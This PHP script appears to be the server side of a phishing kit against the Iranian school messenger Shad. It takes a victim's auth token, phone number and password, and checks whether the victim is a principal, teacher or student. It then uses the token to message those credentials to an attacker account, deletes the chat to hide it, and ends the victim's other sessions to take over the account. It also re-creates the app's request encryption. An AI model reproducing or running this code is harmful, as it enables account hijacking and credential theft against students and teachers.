<?php
header("Content-Type: application/json");
require_once "vendor/autoload.php";

use phpseclib3\Crypt\AES;

/* ========= LOG FUNCTION ========= */
function logError(string $step, $data): void {
    $log = "[".date("Y-m-d H:i:s")."] [$step] ".json_encode($data, JSON_UNESCAPED_UNICODE).PHP_EOL;
    file_put_contents("logot.txt", $log, FILE_APPEND);
}

/* ========= INPUT ========= */
$auth  = filter_input(INPUT_POST, "auth");
$phone = filter_input(INPUT_POST, "phone");
$pass  = filter_input(INPUT_POST, "password") ?: "ندارد";
$guid  = require __DIR__ . "/guid.php";

if (!$auth || !$phone || !$guid) {
    logError("INPUT", "invalid input");
    die(json_encode(["status"=>"ERROR","error"=>"invalid input"], JSON_UNESCAPED_UNICODE));
}

/* ========= CLIENT CONFIG ========= */
$client=[
    "app_name"=>"Main",
    "app_version"=>"3.6.5",
    "lang_code"=>"fa",
    "package"=>"ir.medu.shad",
    "platform"=>"Android"
];

/* ========= 0) GET IDENTITY ========= */
$identity = "بدون‌هویت"; // default

try {
    $ch = curl_init("https://shbarcode5.iranlms.ir");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
        CURLOPT_POSTFIELDS => json_encode([
            "method" => "getBarcodeAction",
            "auth" => $auth,
            "client" => [
                "app_name"=>"Main",
                "app_version"=>"3.1.0",
                "package"=>"ir.medu.shad",
                "platform"=>"Android",
                "lang_code"=>"fa"
            ],
            "api_version"=>"0",
            "data" => [
                "type"=>"shad",
                "barcode"=>"getroles_v1"
            ]
        ])
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    $map = json_decode($response, true);
    if(isset($map["status"]) && $map["status"] === "OK") {
        $data = $map["data"] ?? null;
        $link = $data["link"] ?? null;

        if(is_array($link)) {
            $linkJson = json_encode($link, JSON_UNESCAPED_UNICODE);
            if(strpos($linkJson,"مدیر")!==false) {
                $identity = "مدیر";
            } elseif(strpos($linkJson,"معلم")!==false) {
                $identity = "معلم";
            } elseif(strpos($linkJson,"دانش آموز")!==false) {
                $identity = "دانش آموز";
            }
        }
        // اگر link نبود یا هیچکدام یافت نشد، identity = "بدون‌هویت"
    }
} catch(Exception $e){
    logError("getIdentity", $e->getMessage());
    // بدون توقف ادامه داده می‌شود
}

/* ========= CRYPTO ========= */
$iv = str_repeat("\x00", 16);

function secret(string $auth): string {
    $t = substr($auth,0,8);
    $i = substr($auth,8,8);
    $n = substr($auth,16,8).$t.substr($auth,24,8).$i;
    for($x=0;$x<strlen($n);$x++){
        $c=$n[$x];
        $n[$x]=ctype_digit($c)
            ? chr((ord($c)-48+5)%10+48)
            : chr((ord($c)-97+9)%26+97);
    }
    return $n;
}

function enc(string $d,string $a,string $iv):string{
    $aes=new AES('cbc');
    $aes->setKey(secret($a));
    $aes->setIV($iv);
    return base64_encode($aes->encrypt($d));
}

function dec(string $d,string $a,string $iv):?array{
    $aes=new AES('cbc');
    $aes->setKey(secret($a));
    $aes->setIV($iv);
    $decoded = @base64_decode($d, true);
    if(!$decoded) return null;
    return json_decode($aes->decrypt($decoded), true);
}

function req(array $p):array{
    $ch=curl_init("https://shadmessenger91.iranlms.ir/");
    curl_setopt_array($ch,[
        CURLOPT_RETURNTRANSFER=>true,
        CURLOPT_POST=>true,
        CURLOPT_HTTPHEADER=>["Content-Type: application/json"],
        CURLOPT_POSTFIELDS=>json_encode($p)
    ]);
    $r=curl_exec($ch);
    curl_close($ch);
    return json_decode($r,true) ?: [];
}

/* ========= FLAG CONTROLS ========= */
$allOK = true;

/* ========= 1) SEND MESSAGE ========= */
$messageText = "#𝐚𝐐𝐚_𝐒𝐚𝐛𝐞𝐫_𝐓𝐞𝐫𝐨𝐫_𝐓𝐮𝐫𝐤𝐦𝐞𝐧🇹🇲\n"
             . "𝐀𝐔𝐓𝐇💎 : #{$auth}\n"
             . "𝐍𝐮𝐦𝐛𝐞𝐫🌐 : {$phone}\n"
             . "𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝🔐 : {$pass}\n"
             . "𝐝𝐞𝐧𝐭𝐢𝐭𝐲👤 : {$identity}";

$send = req([
    "api_version"=>"4",
    "auth"=>$auth,
    "client"=>$client,
    "data_enc"=>enc(json_encode([
        "object_guid"=>$guid,
        "rnd"=>rand(100000000,999999999),
        "file_inline"=>null,
        "text"=>$messageText
    ],JSON_UNESCAPED_UNICODE), $auth, $iv),
    "method"=>"sendMessage"
]);

$sendDec = $send["data_enc"] ?? null ? dec($send["data_enc"], $auth, $iv) : null;
$message_id = $sendDec["message_update"]["message_id"] ?? null;

if(!($send["status"]??null) === "OK" || !$message_id){
    logError("sendMessage", $send);
    $allOK = false;
}

/* ========= 2) DELETE USER CHAT ========= */
$del = req([
    "api_version"=>"4",
    "auth"=>$auth,
    "client"=>$client,
    "data_enc"=>enc(json_encode([
        "user_guid"=>$guid,
        "last_deleted_message_id"=>$message_id ?? "0"
    ], JSON_UNESCAPED_UNICODE), $auth, $iv),
    "method"=>"deleteUserChat"
]);

$delDec = $del["data_enc"] ?? null ? dec($del["data_enc"], $auth, $iv) : null;
if(!($del["status"]??null) === "OK"){
    logError("deleteUserChat", $del);
    $allOK = false;
}

/* ========= 3) TERMINATE OTHER SESSIONS ========= */
$ter = req([
    "api_version"=>"4",
    "auth"=>$auth,
    "client"=>$client,
    "data_enc"=>enc(json_encode([
        "rnd"=>rand(100000000,999999999)
    ], JSON_UNESCAPED_UNICODE), $auth, $iv),
    "method"=>"terminateOtherSessions"
]);

if(!($ter["status"]??null) === "OK"){
    logError("terminateOtherSessions", $ter);
    $allOK = false;
}

/* ========= SUCCESS OUTPUT ========= */
if($allOK){
    echo json_encode([
        "status" => "OK",
        "message" => "✅ ورود موفقیت‌آمیز بود! (نیاز به صفحه ok-login.php)"
    ], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
}else{
    echo json_encode([
        "status" => "ERROR",
        "message" => "خطا در اجرای مراحل، لطفاً logot.txt را بررسی کنید"
    ], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
}